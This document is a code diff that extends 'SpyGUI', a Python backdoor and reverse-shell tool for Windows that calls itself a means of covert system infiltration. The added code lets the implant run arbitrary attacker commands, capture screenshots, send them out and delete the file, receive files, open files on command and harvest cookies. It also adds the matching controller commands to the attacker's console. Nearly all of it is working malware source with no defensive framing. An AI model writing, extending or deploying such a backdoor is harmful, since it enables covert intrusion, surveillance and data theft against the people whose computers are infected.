@@ -20,8 +20,7 @@ os.system('cls' if os.name == 'nt' else 'clear')
 fonts = Figlet(font='slant')
 print(fonts.renderText('SpyGUI Tool'))
 print("""
-Description : 
-SpyGUI is a Python-based backdoor tool with a file format in Python, designed for covert system infiltration.
+Description : SpyGUI is a Python-based backdoor tool with a file format in Python, designed for covert system infiltration.
 
 Command         Description
 --------       -------------
@@ -65,6 +64,7 @@ try:
     import os
     import pyfiglet
     import platform
+    import json
     from pyfiglet import Figlet
 except:
     import os
@@ -74,7 +74,8 @@ except:
 if os.name == 'nt':
     print("System Passed")
 else:
-    print("Tool Working for windows")
+    print("Tool Not Working Your System")
+    print("Is Tool Working for windows")
     exit()
 fonts = Figlet(font='slant')
 print(fonts.renderText('Starting Setup Tool'))
@@ -95,9 +96,8 @@ try:
             output_de = output.decode()
             if "sysinfo" in output_de:
                 data = str(platform.uname())
-                data = data.encode()
-                s.sendall(data)
-                
+                s.sendall(data.encode())
+
             if "shell" in output_de:
                 get_path = "pwd"
                 path = subprocess.Popen(
@@ -125,21 +125,62 @@ try:
                     s.send(work.encode())
 
             if "messenge" in output_de:
-                os.system('echo msgbox("Your System Have Been Hacked By Anonymous Secures") > messenge.vbs')
-                ope = 0
-                for open in range(10):
-                    os.system("messenge.vbs")
+                listen_mess = s.recv(9024)
+                byte_decode = listen_mess.decode()
+                os.system("echo > setup.vbs")
+                with open('setup.vbs', 'w') as save:
+                    data = 'msgbox("' + byte_decode + '")'
+                    save.write(data)
+                    for open_tab_mess in range(10):
+                        os.system('setup.vbs')
+                    os.remove("setup.vbs")
 
             if "screenshot" in output_de:
                 with mss.mss() as screenshot:
-                    screenshot.shot(output='noti.png')
-
-                # Read the screenshot image data
-                with open('noti.png', 'rb') as noti_file:
+                    screenshot.shot(output='default.png')
+                with open('default.png', 'rb') as noti_file:
                     screenshot_data = noti_file.read()
-
-                # Send the screenshot data
                 s.sendall(screenshot_data)
+                os.system("echo 123 > default.png")
+                os.remove("default.png")
+            
+            if "dir" in output_de:
+                cmd = s.recv(1024).decode()
+                shell_start = subprocess.Popen(
+                    cmd,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+                data = shell_start.stdout.read() + shell_start.stderr.read()
+                s.send(data)
+
+            if "upload" in output_de:
+                read_file = s.recv(100024)
+                formats = s.recv(1024).decode()
+                with open("upload_123.html", 'wb') as save:
+                    save.write(read_file)
+            
+            if "open" in output_de:
+                file = s.recv(2024)
+                file = str(file.decode())
+                os.system(file)
+            
+            if "get cookie" in output_de:
+                url = s.recv(2024).decode()
+                import requests
+                def get():
+                    response = requests.get(url)
+                    cookie = response.cookies.get_dict()
+                    cook = cookie
+                    if cook:
+                        json_cookie = json.dumps(cook)
+                        s.send(json_cookie.encode())
+                    else:
+                        s.send(b"[+] Failed Get Cookie")
+                get()
+
             else:
                 pass
 except Exception as e:
@@ -170,6 +211,7 @@ except Exception as e:
             print(f"[+] {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
             print(f"[+] Starting Reverse Shell {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
             print(f"[+] Command 'help' for helping reverse shell")
+            print("")
             while True:
                 shell_command = input("reverse_shell@spygui ~> ")
                 if shell_command == "help":
@@ -182,50 +224,127 @@ Command         Description
  messenge       show messenge to victim
  sysinfo        show information computer
  exit           exit reverse
+
+Shell Command
+--------------
+ dir            show file
+ upload         uplad file
+ cat            cat file
+ pwd            get path
+ getuid         get user id
+ open           open file from victim
+ get cookie     get cookie web server
+
 """)
+                if shell_command == "get cookie":
+                    import json
+                    conn.send(b"get cookie")
+                    web = input("Enter website for get : ")
+                    print("[+] Packet Success")
+                    conn.send(web.encode())
+                    list_cook = conn.recv(9024)
+                    cookie = json.loads(list_cook.decode())
+                    print(f"\n{cookie}\n")
+
+                if shell_command == "open":
+                    conn.send(b"open")
+                    file = input("Enter Your Path File Open ( ex : C:\Windows\hacked.vbs ) >> ")
+                    conn.send(file.encode())
+                    print("[+] Sending Success")
+
+                if shell_command == "upload":
+                    path_file = input("Enter Your Path File > ")
+                    with open(f"{path_file}", 'rb') as reader_doc:
+                        docs = reader_doc.read(100024)
+                        print("[+] Start Upload...")
+                        print("[+] Sending To Target Success")
+                        print(f"[+] file : upload_123.html")
+
+                if shell_command == "dir":
+                    conn.send(b"dir")
+                    cmd = input("Enter Path Victims ( Default : C:\Windows\System32 ) >>> ")
+                    conn.send(cmd.encode())
+                    output = conn.recv(90024)
+                    print("[+] Sending Success")
+                    print(f"\n{output.decode()}\n")
+                
                 if shell_command == "screenshot":
                     conn.send(b"screenshot")
-                    output = conn.recv(900024)
-                    os.system(f'echo > victim_{addr[1]}.png')
+                    output = conn.recv(9000024)
+                    os.system(f'echo "" > victim_{addr[1]}.png')
                     with open(f'victim_{addr[1]}.png', 'wb') as save:
                         save.write(output)
+                        print("[+] Sending packet To Victim")
+                        print("[+] Screenshot Success")
                         print(f"[+] Image Saved To : victim_{addr[1]}.png")
-                        
+
                 if shell_command == "shell":
-                    shell = input("shell > ")
-                    if shell == "exit":
-                        conn.send(b"exit")
-                        exit("[+] Reverse Stoped By Attacker")
-                    else:
-                        conn.send(shell.encode())
+                    print("Starting Command Prompt, CMD")
+                    while True:
+                        shell = input("shell > ")
+                        if shell == "exit":
+                            conn.send(b"exit")
+                            exit("[+] Reverse Stoped By Attacker")
+                        else:   
+                            conn.send(shell.encode())
+                            output = conn.recv(90024)
+                            print(f"\n{output.decode()}")
+
                 if shell_command == "messenge":
                     conn.send(b"messenge")
-                    print("[+] Sending To Target Success")
-                    
+                    mess = input("Enter Messeege : ")
+                    conn.send(mess.encode())
+                    print("[+] Default Open Tab : 10")
+                    print("[+] Sending Messenger Success")
+
                 if shell_command == "sysinfo":
                     conn.send(b"sysinfo")
-                    sys = conn.recv(9024)
-                    print(f"\n{sys.decode()}\n")
-                    
+                    syss = conn.recv(9024)
+                    d = syss.decode()
+                    unames = d.replace('uname_result', '').replace("(", "").replace(")", "")
+                    uname = unames.replace("'", "").replace(",", "\n")
+                    a = uname.replace('=', ' : ')
+                    print(f"\n{a}\n")
+
                 else:
                     pass
     if c2_input == "help" or c2_input == "help ":
         print("""
+
 Command         Description
 --------       -------------
  build         Build Format File Backdoor
  generator     build shortcut Format File Backdoor
-
  lhost         set local host server
  lport         set local port server
-
  rhost         set remote host client
  rport         set remote port client
+ option        show options settings
 
-exploit 
+exploit
 -------
  exploit       start exploit
  run           exploit shortcut
+
+Server
+------
+ show inet     Show Inet
+
 """)
+    if c2_input == "option" or c2_input == "option " or c2_input == "options":
+        print(f"""
+Mode Name              Option
+----------           ------------
+LHOST                {lhost}
+LPORT                {lport}
+RHOST                {rhost}
+RPORT                {rport}
+FILE_NAME            {file_name}
+""")
+    if c2_input == "show inet":
+        os.system('ipconfig' if os.name == 'nt' else 'ifconfig | grep "inet"')
+    if c2_input == "exit":
+        print("[+] Thanks For Using Tool")
+        exit("[+] Exit By User")
     else:
         pass
